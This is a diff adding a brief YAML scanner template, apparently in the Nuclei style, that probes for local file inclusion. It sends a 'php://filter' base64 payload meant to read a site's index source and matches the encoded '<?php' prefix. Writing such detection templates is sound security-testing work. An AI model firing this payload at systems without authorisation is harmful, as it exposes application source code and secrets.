@@ -1,0 +1,20 @@
+id: lfi6-1220
+name: 'Traversal in upload'
+severity: high
+type: active
+tags:
+  - lfi
+  - traversal
+  - file
+description: 'Reads sensitive file via upload'
+requests:
+  - method: GET
+    path: '{{BaseURL}}'
+    payloads:
+      upload:
+        - 'php://filter/convert.base64-encode/resource=index'
+    matchers:
+      - type: word
+        part: body
+        words:
+          - 'PD9waHA'
